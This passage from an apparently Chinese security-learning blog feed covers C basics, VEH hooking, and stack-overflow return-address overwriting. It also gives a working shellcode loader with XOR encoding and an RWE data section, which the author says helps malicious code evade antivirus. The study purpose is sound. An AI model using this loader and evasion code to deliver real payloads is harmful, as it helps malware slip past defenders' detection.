src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649916449939.png"></p><h1 id="0x04-代码注入调试练习"><a href="#0x04-代码注入调试练习" class="headerlink" title="0x04-代码注入调试练习"></a>0x04-代码注入调试练习</h1><p>先使用OD打开notepad++，并F9直至notepad++处于运行状态</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922555004.png" alt="进行设置"></p><p>然后查看notepad++ PID并注入</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922580481.png"></p><p>注入之后会断在ThreadProc函数</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922621425.png"></p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922671867.png"></p><p>在x32中</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649923028194.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础知识补充</title>
      <link href="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/"/>
      <url>/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-typedef定义函数指针"><a href="#0x00-typedef定义函数指针" class="headerlink" title="0x00-typedef定义函数指针"></a>0x00-typedef定义函数指针</h1><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>在此之前我们要先了解函数指针，即存放函数首地址的变量，而函数名就是函数的首地址，为了存放函数的首地址就需要定义函数指针</p><pre class="language-c" data-language="c"><code class="language-c">void hello(){printf("this is hello!");}//函数指针定义void (*fp)()=hello;//函数指针定义时应保证函数返回值与参数个数、类型相同，在这里void是返回类型，(*fp)后面的()是函数参数/*也可以理解为void (*fp)();fp=hello;*///通过函数指针调用函数fp();int add(int a,int b){    return a+b;}//函数指针定义,形参可以不写变量名int (*fp1)(int,int)=add;//函数调用fp1(1,2);</code></pre><h2 id="typedef与函数指针混合使用"><a href="#typedef与函数指针混合使用" class="headerlink" title="typedef与函数指针混合使用"></a>typedef与函数指针混合使用</h2><pre class="language-c" data-language="c"><code class="language-c">typedef int (*FP)(int,int);</code></pre><p>那么我们在赋值的时候就可以改成</p><pre class="language-c" data-language="c"><code class="language-c">FP fp1=add;//fp1就是返回值为int型，参数为两个int型的函数指针，FP表示函数指针的类型，通过类型名+变量名就可以定义函数指针fp1(1,2);</code></pre><h1 id="0x01-回调函数"><a href="#0x01-回调函数" class="headerlink" title="0x01-回调函数"></a>0x01-回调函数</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>如果函数的参数具有函数指针，那么这样的函数就被称为回调函数</p><p>函数指针就是当作接口使用的</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="language-c" data-language="c"><code class="language-c">//这里的call就是回调函数,这里传递函数指针和我们传入数组时使用函数指针是类似的，都是使用指针将首地址进行传递，而不是传整个函数void call(void(*fp)()){    fp();//这样调用的时候就不需要考虑函数指针的变量名，只要传递的函数是这样类型的即可在call函数中进行调用    return ;}//当然也可以使用typedef，让回调函数更简洁typedef void (*fp)();void call(fp){    fp();    return ;}void hello(){    printf("hello");}void show(){    printf("show");}//如果不使用回调函数，调用时需要hello();show();int main(){    call(show);    call(hello);//使用回调函数调用，这样只需要传入不同参数即可完成调用    return 0;}</code></pre><h1 id="0x02-复杂函数"><a href="#0x02-复杂函数" class="headerlink" title="0x02-复杂函数"></a>0x02-复杂函数</h1><p>定义复杂的回调函数</p><pre class="language-c" data-language="c"><code class="language-c">void *handle(void*arg){    printf("arg is %X\n",arg);    return arg;//返回值是void*}//我们要定义一个参数为函数指针，返回值为函数指针的回调函数//先来看参数，传入函数指针void* (*fp)(void *),另一个还要传入的是arg，这里定义为void*p//然后再定义一个以上面两个参数为函数参数，返回值是函数指针(这里是handle函数指针)的函数void *(*call(void *(fp)(void*),void*p))(void *)//在这里call是回调函数的变量名，void*是返回值，最后的(void*)是返回的函数指针的参数，call()里的两个是回调函数的参数{    fp(p);    return fp;}int main(){    int num=10;    void*(*fp)(void*)=call(handle,&amp;num);//使用对应类型的函数指针接收    return 0;}//为了方便理解，使用typedeftypedef void*(*FP)(void*);FP call(FP fp1,void*p){    fp1(p);    return fp;}</code></pre><h1 id="0x03-一维数组内存"><a href="#0x03-一维数组内存" class="headerlink" title="0x03-一维数组内存"></a>0x03-一维数组内存</h1><pre class="language-c" data-language="c"><code class="language-c">int arr[6]={10,20,30,40};//当有初始值时，剩余没定义的默认为0，如果没有定义初始值，则为随机值</code></pre><p>因为数组长度定义为6，类型为int，所以在内存中分配24个字节</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649861619368.png" alt="数组在栈中的存储"></p><h1 id="0x04-函数声明"><a href="#0x04-函数声明" class="headerlink" title="0x04-函数声明"></a>0x04-函数声明</h1><p>返回值+函数名+参数</p><pre class="language-c" data-language="c"><code class="language-c">//函数声明int sum(int,int);int sum(int a,int b){return a+b;}</code></pre><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649862553289.png" alt="原因"></p><h1 id="0x05-调用约定"><a href="#0x05-调用约定" class="headerlink" title="0x05-调用约定"></a>0x05-调用约定</h1><p>为什么要有不同的调用约定——是因为调用函数之后需要清理栈，而不同的调用约定对应不同的清理方式</p><blockquote><p>__cdecl：调用者自己清理栈</p><pre class="language-c" data-language="c"><code class="language-c">//函数外部call hello;函数add esp,立即数</code></pre><p>__stdcall：函数自己清理栈</p><pre class="language-c" data-language="c"><code class="language-c">//函数内部retn 立即数</code></pre></blockquote><p>如果使用__cdcel调用方式，因为不同编译器产生的栈不同，所以不能很好地清理栈，而stdcall则可以在函数内部完成清理栈。</p><blockquote><p> <strong>所以，在跨（开发）平台的调用中，我们都使用stdcall（有时是以WINAPI的样子出现）。那么为什么还需要_cdecl呢？当我们遇到这样的函数如fprintf()它的参数是可变的，不定长的，被调用者事先无法知道参数的长度，事后的清除工作也无法正常的进行，因此，这种情况我们只能使用cdecl</strong> </p></blockquote><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898026998.png"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898651751.png"></p><h1 id="0x06-extern-“C”"><a href="#0x06-extern-“C”" class="headerlink" title="0x06-extern “C”"></a>0x06-extern “C”</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898161708.png"></p><p>也就是说如果不声明为extern “C”，我们导出的函数名会被修饰</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898480365.png" alt="DLL代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898496934.png" alt="导出的函数名称"></p><p>可以看到我们的函数名被修饰了，在调用的时候我们无法通过GetProcAddress通过函数名调用</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898566926.png" alt="代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898581787.png" alt="导出的函数名称"></p><p>可以看到我们的函数名没有被修饰</p><blockquote><p><strong>C++函数重载即函数名可以相等，只要该函数的参数类型或者个数不同即可</strong></p></blockquote><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>标准文件头</p><pre class="language-c" data-language="c"><code class="language-c">#ifndef __INCvxWorksh  /*防止该头文件被重复引用*/#define __INCvxWorksh#ifdef __cplusplus    //__cplusplus是cpp中自定义的一个宏extern "C" {          //告诉编译器，这部分代码按C语言的格式进行编译，而不是C++的#endif    /**** some declaration or so *****/  #ifdef __cplusplus}#endif#endif /* __INCvxWorksh */</code></pre><blockquote><p> extern是C/C++语言中表明函数和全局变量作用范围（可见性）的关键字，该关键字告诉编译器，其声明的函数和变量可以在本模块或其它模块中使用 </p></blockquote><h1 id="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"><a href="#0x07-HMOUDLE、HANDLE、HWND、HINSTANCE" class="headerlink" title="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"></a>0x07-HMOUDLE、HANDLE、HWND、HINSTANCE</h1><p>这里就不看定义了，越看越晕（</p><h2 id="HWND"><a href="#HWND" class="headerlink" title="HWND"></a>HWND</h2><p>HWND是线程相关的，可以通过HWND找到该窗口所属进程的句柄</p><h2 id="HANDLE"><a href="#HANDLE" class="headerlink" title="HANDLE"></a>HANDLE</h2><p>Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄</p><blockquote><p><strong>系统对内核对象以链表的形式进行管理，载入到内存中的内核对象都有一个线性地址，同时相对系统来说，在串列中有一个索引位置，这个索引位置就是内核对象的HANDLE</strong></p></blockquote><h2 id="HINSTANCE"><a href="#HINSTANCE" class="headerlink" title="HINSTANCE"></a>HINSTANCE</h2><p>HINSTANCE的本质是模块基地址，它仅在同一进程中才有意义，跨进程的HINSTANCE是没有意义的</p><h2 id="HMODULE"><a href="#HMODULE" class="headerlink" title="HMODULE"></a>HMODULE</h2><blockquote><p><strong>代表应用程序载入的模块，WIN32系统下通常是被载入模块的线性地址，比如exe, dll等模块等</strong></p></blockquote><blockquote><p> HINSTANCE 在win32下与HMODULE是相同的东西(只有在16位windows上，二者有所不同) </p></blockquote><h1 id="0x08-命令行参数"><a href="#0x08-命令行参数" class="headerlink" title="0x08-命令行参数"></a>0x08-命令行参数</h1><p>我们知道main函数实际上是有两个参数的，但一般不会进行使用</p><p>其原型如下</p><pre class="language-c" data-language="c"><code class="language-c">main(int argc,char*argv[])</code></pre><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008765976.png"></p><p>这两个参数实际上与命令行相关</p><pre class="language-c" data-language="c"><code class="language-c">//argc是一个整数，其代表了命令行参数个数//argv是一个指针数组，可以接收多个参数，第一个也就是argv[0]指向输入的程序路径及名称//如果在命令行中运行，argc为1，也就是只有一个参数</code></pre><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008701868.png"></p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(int argc,char *argv[]){printf("命令行参数个数为：%d\n", argc);for (int i = 0; i &lt; argc; ++i){printf("第%d个命令行参数为：%s\n", i, argv[i]);}return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VEH</title>
      <link href="/2022/04/10/VEH/"/>
      <url>/2022/04/10/VEH/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-VEH"><a href="#0x00-VEH" class="headerlink" title="0x00-VEH"></a>0x00-VEH</h1><p>VEH的中文名字为：向量化异常处理 （Vectored Exception Handling） ，是为操作系统提供的异常处理机制，类似于SEH，VEH的优先级高于SEH</p><p> <img src="/2022/04/10/VEH/592902_92wf161s7cgif01.png" alt="应用层异常处理结构图"> </p><h1 id="0x01-VEH回调函数详解"><a href="#0x01-VEH回调函数详解" class="headerlink" title="0x01-VEH回调函数详解"></a>0x01-VEH回调函数详解</h1><blockquote><p>VEH由AddVectorExceptionHandler添加处理函数，处理函数有一个参数</p><p>参数类型为PEXCEPTION_POINTERS结构体</p><p>结构PEXCEPTION_POINTERS保存着当前异常的各个寄存器，堆栈，地址等多种信息</p></blockquote><p> <img src="/2022/04/10/VEH/592902_cvh37cwxtybvmyq.png" alt="pEXCEPTION_POINTER"> </p><h1 id="0x02-VEH-Hook原理"><a href="#0x02-VEH-Hook原理" class="headerlink" title="0x02-VEH Hook原理"></a>0x02-VEH Hook原理</h1><blockquote><p>1、异常处理结构中，VEH是唯一一个可以接收到所有异常信息的处理。换句话说：所有的异常信息都会经过VEH</p><p>2、异常信息通常是由数组越界、内存访问出错、无效参数、int 3等造成的</p><p>3、一旦发生异常，操作系统会立即遍历VEH，如果有处理函数，中断线程，并由处理函数处理</p></blockquote><p>思路</p><p>如果我们要Hook消息框，首先要给API的首地址写入int 3断点，当执行时会产生异常，线程暂停，转交给异常处理函数处理，此时我们可以在处理函数中修改堆栈参数等</p><p>相应操作完成后将int 3(0xCC)修改回源代码 修改EIP=addr(异常地址)，然后让此处的代码重新执行一次正确的代码</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("ldata")char trapcode[] = "*";unsigned long long llcode = 204;//CC 00 00 00INT3#pragma data_seg()#pragma comment(linker,"/SECTION:ldata,RWE")void Decshellcode(){llcode = 0xF333333333333333;llcode &lt;&lt;= 2;char* data = (char*)&amp;llcode;/** 解密shellcode 并且执行* len 解密后的指令长度* data 把解密后的指令写入data* 比如 push ebp 就向data写入0x55* 每次解密一条指令 不要用超过7字节的指令和跳转指令*/MessageBoxA(0, "不要再打辣", "停下", MB_OK);return ;}long _stdcall ExceptionHandle(PEXCEPTION_POINTERS val){//判断是否为int3断点if (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT){Decshellcode();//执行shellcode//修改EIPval-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;//表示成功处理，让程序继续执行return EXCEPTION_CONTINUE_EXECUTION;}//继续往下搜索异常处理函数elsereturn EXCEPTION_CONTINUE_SEARCH;}#pragma optimize("",off)int main(){//创建VEH，当第一个参数不为0，则异常处理函数是第一个要调用的处理程序。如果参数为0，则处理程序是要调用的最后一个处理程序//第二个参数是一个异常处理函数AddVectoredExceptionHandler(1, ExceptionHandle);int bilibili = 2020;int arr[2] = { 1,2 };int ti = 23;arr[5] = (int)&amp;llcode;return 0;}#pragma optimize("",on)</code></pre><p><img src="/2022/04/10/VEH/1649639633494.png"></p><p>这里修改EIP为我们的Print()函数，因为函数名表示的就是函数地址，所以就是让他执行我们的Print函数</p><h1 id="0x03-VEH实现隐藏函数调用"><a href="#0x03-VEH实现隐藏函数调用" class="headerlink" title="0x03-VEH实现隐藏函数调用"></a>0x03-VEH实现隐藏函数调用</h1><p>我们知道函数调用时，会先把call的地址压入栈中，而在函数内部的返回ret指令就是从栈中取出call指令的下一条地址</p><p>所以我们可以对栈中的地址进行修改让其调用我们的函数</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;void showflag(){MessageBoxA(0, "this is flag", "flag", MB_OK);return ;}long _stdcall ExceptionHandler(PEXCEPTION_POINTERS val){//将EIP也就是下一条执行的指令修改为retval-&gt;ContextRecord-&gt;Eip += 6;//降低栈顶val-&gt;ContextRecord-&gt;Esp -= 4;//入栈,将ret下一条指令压入栈中*(int*)val-&gt;ContextRecord-&gt;Esp = val-&gt;ContextRecord-&gt;Eip + 1;//和上面一样，这次修改为我们想要执行的地址val-&gt;ContextRecord-&gt;Esp -= 4;*(int*)val-&gt;ContextRecord-&gt;Esp=*(int*)(val-&gt;ContextRecord-&gt;Ebp-8);return EXCEPTION_CONTINUE_EXECUTION;}int main(){AddVectoredExceptionHandler(1, ExceptionHandler);DWORD a = (DWORD)showflag;int k = 0;int c;c=a / k;//构造除0异常__asm{ret}printf("Get flag!!!");return 0;}</code></pre><p>具体的可以先看汇编</p><p><img src="/2022/04/10/VEH/1649645606291.png"></p><p>触发除零异常后，PEXCEPTION_POINTERS val会接收此时的信息</p><p>我们先将EIP修改为ret指令，然后将ret下一条指令压入栈中，再把我们要调用的函数压入栈，这时候栈的结构为</p><p><img src="/2022/04/10/VEH/1649645936725.png"></p><p>返回值为EXCEPTION_CONTINUE_EXECUTION，表示继续往下执行，这时候EIP是ret指令，取出栈顶元素，跳转过去，执行完我们的shellcode后也存在ret，此时的栈为</p><p><img src="/2022/04/10/VEH/1649646048618.png"></p><p>shellcode尾部的ret取出栈顶的值，跳转过去，回到我们正常的程序</p><blockquote><p>修改EIP的时候也可以</p><pre class="language-none"><code class="language-none">val-&gt;ContextRecord-&gt;Eip = (DWORD)val-&gt;ExceptionRecord-&gt;ExceptionAddress+6;</code></pre><p>ExceptionRecord-&gt;ExceptionAddress是触发异常的地址</p><p>ExceptionRecord-&gt;ExceptionCode表示异常的类型</p></blockquote><p>异常类型</p><p><img src="/2022/04/10/VEH/1649646418174.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode知识</title>
      <link href="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Shellcode"><a href="#0x00-Shellcode" class="headerlink" title="0x00-Shellcode"></a>0x00-Shellcode</h1><p>什么是shellcode</p><blockquote><p> 在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码 </p></blockquote><h1 id="0x01-杀毒软件甄别病毒的技术原理"><a href="#0x01-杀毒软件甄别病毒的技术原理" class="headerlink" title="0x01-杀毒软件甄别病毒的技术原理"></a>0x01-杀毒软件甄别病毒的技术原理</h1><h2 id="基于特征进行甄别"><a href="#基于特征进行甄别" class="headerlink" title="基于特征进行甄别"></a>基于特征进行甄别</h2><p>主要是病毒以前留下的信息，基于这些信息，我们可以判断存在病毒。</p><p>我们知道在PE文件中的.text段存放的是可执行代码，而杀毒软件会将其内容读取出来，并进行程序特征提取，判断可执行代码中是否存在病毒的特征，有的话就确定该程序存在病毒。</p><p>这也就是为什么病毒还未运行就被发现的原因。</p><h2 id="基于病毒的行为进行甄别"><a href="#基于病毒的行为进行甄别" class="headerlink" title="基于病毒的行为进行甄别"></a>基于病毒的行为进行甄别</h2><p>主要是针对病毒行为的敏感操作，当病毒想干坏事的时候，难免会调用API，当出现比较敏感的操作时，确定该程序为病毒。</p><h1 id="0x03-一个简单的Loader"><a href="#0x03-一个简单的Loader" class="headerlink" title="0x03-一个简单的Loader"></a>0x03-一个简单的Loader</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;unsigned char  shellcode[] ="\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C""\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53""\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B""\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75""\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD""\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE""\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24""\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03""\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9""\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61""\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";int main(){//分配内存，并设置为可读可写可执行，大小为shellcode的大小LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);if (Memory == NULL)//当开辟失败时，直接结束{return 1;}//将shellcode复制到内存中memcpy(Memory, shellcode, sizeof(shellcode));/*DWORD dold;VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);*///强制转换为函数((void(*)())Memory)();return 0;}</code></pre><p>运行时会直接弹出消息框</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649555515604.png"></p><p>整个过程就是先开辟内存（注意要注意属性），然后将shellcode复制到内存中，再将我们复制的数据强制转换为函数并进行调用。这些行为和特征都是没有什么问题的，所以如果我们插入的是恶意代码，是可以绕过杀毒软件的。</p><h1 id="0x04-优化Loader"><a href="#0x04-优化Loader" class="headerlink" title="0x04-优化Loader"></a>0x04-优化Loader</h1><h2 id="内存分配优化"><a href="#内存分配优化" class="headerlink" title="内存分配优化"></a>内存分配优化</h2><p>因为数据本身就占有内存，所以不需要重新进行分配，直接使用即可</p><h2 id="改变属性"><a href="#改变属性" class="headerlink" title="改变属性"></a>改变属性</h2><p>因为数据存储于数据段中，而我们要让其可以执行，则需要改变其属性为可执行</p><blockquote><p>0xC000005报错表示内存访问的属性问题</p></blockquote><pre class="language-c" data-language="c"><code class="language-c">BOOL VirtualProtect(  [in]  LPVOID lpAddress,  [in]  SIZE_T dwSize,  [in]  DWORD  flNewProtect,  [out] PDWORD lpflOldProtect);</code></pre><p>第一个参数是地址起始位置</p><p>第二个参数是需要改变的内存大小</p><p>第三个参数是想要改变的属性</p><p>主要有</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/42dad68bad2c64271524c48a96f3822.png"></p><p>第四个参数</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556346133.png"></p><p>所以我们要让他指向有效变量，而不能是NULL</p><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>不知道为什么使用这种方法在VS会报错-无法强制转换</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556539202.png"></p><h1 id="0x05-更进一步"><a href="#0x05-更进一步" class="headerlink" title="0x05-更进一步"></a>0x05-更进一步</h1><p>因为上一步将内存的属性修改并执行，那么一定会审计我们的shellcode，如果shellcode存在恶意的行为，很快就会被辨别出来，所以我们要对其进行加密，使其无法被识别。当然要注意要进行解密操作。</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("vdata")unsigned char  shellcode[] ="\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C""\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53""\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B""\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75""\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD""\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE""\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24""\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03""\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9""\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61""\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";#pragma data_seg()//创建段，名称为vdata#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性int main(){//加密函数for (int i = 0; i &lt; sizeof(shellcode); ++i){shellcode[i] ^= 0x23;}//分配内存，并设置为可读可写可执行，大小为shellcode的大小LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);if (Memory == NULL)//当开辟失败时，直接结束{return 1;}//将shellcode复制到内存中memcpy(Memory, shellcode, sizeof(shellcode));//解密函数for (int i = 0; i &lt; sizeof(shellcode); ++i){*((char*)Memory + i) ^= 0x23;}////DWORD dold;////VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);////强制转换为函数((void(*)())Memory)();return 0;}</code></pre><p>因为杀毒软件可能将代码上传到云端跑（因为存在一些敏感行为，VirtualProtect等），这时候我们的shellcode可能被识别，所以我们要避免VirtualProtect操作，那么如何创建可读可写可执行的段呢。这时候就用到了预处理#pragma</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("vdata")unsigned char  shellcode[] ="\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C""\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53""\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B""\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75""\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD""\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE""\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24""\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03""\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9""\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61""\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";#pragma data_seg()//创建段，名称为vdata#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性int main(){//分配内存，并设置为可读可写可执行，大小为shellcode的大小LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);if (Memory == NULL)//当开辟失败时，直接结束{return 1;}//将shellcode复制到内存中memcpy(Memory, shellcode, sizeof(shellcode));//DWORD dold;//VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);//强制转换为函数((void(*)())Memory)();return 0;}</code></pre><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649557566937.png"></p><h1 id="0x06-栈溢出"><a href="#0x06-栈溢出" class="headerlink" title="0x06-栈溢出"></a>0x06-栈溢出</h1><h2 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h2><p>首先要先了解X86栈和函数调用的机制</p><p>首先先把call的下一条地址压入栈中，再把ebp压入栈，最后提升栈底，也就是mov ebp,esp，而函数内部的变量起始地址是ebp-0x04，依次往后，当给变量赋值过大的值时，可能会覆盖函数结束时ret的值，进而执行我们的shellcode</p><blockquote><p>数组的赋值是从低地址往高地址赋值</p></blockquote><p>所以我们可以通过数组越界覆盖ret原本的地址</p><p>代码</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;iostream&gt;//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")void Decshellcode(){//完成恶意代码的释放、解密、执行MessageBoxA(0, "不要再打了", "我错了", MB_OK);}#pragma optimize("",off)int main(){int a = 2022;//0int arr[2] = { 1,2 };//1,2int ti = 23;//3arr[5] = (int)Decshellcode;return 0;}#pragma optimize("",on)</code></pre><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578699864.png"></p><p>这里会先把0xD61212压入栈中</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578767663.png"></p><p>然后将ebp的值压入栈</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578844982.png" alt="ebp入栈"></p><p>提升栈底就不看了，来看变量的赋值过程，可以看到是从栈底往低地址压入的</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579064005.png"></p><p><strong>数组入栈</strong></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579162383.png"></p><p>可以看到这里是不一样的，数组下标小的元素在低地址，所以可以通过数组越界覆盖原本压入的call下一条地址</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579335339.png"></p><p>arr[0]是首元素，那么arr[5]对应的就是ret的地址</p><pre class="language-c" data-language="c"><code class="language-c">arr[5] = 